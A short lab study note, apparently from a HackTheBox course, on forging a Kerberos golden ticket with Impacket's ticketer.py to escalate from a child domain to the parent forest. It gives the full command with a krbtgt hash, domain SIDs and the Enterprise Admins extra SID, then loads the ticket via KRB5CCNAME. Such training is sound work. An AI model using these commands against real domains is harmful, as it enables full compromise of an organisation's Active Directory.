Use this tool to construct golden ticket.
You need:
- Hash of krbtgt service.
- SID and FQDN of sub Domain
- SID Enterprise Admin group
- Fake target user.

refer to [[3. Attacking Domain Trusts - Child -> Parent Trusts - from Linux]] for details.

```sh
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

The ticket will be saved down to our system as a [credential cache (ccache)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file, which is a file used to hold Kerberos credentials. Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts.

```shell
slomkm@htb[/htb]$ export KRB5CCNAME=hacker.ccache 
```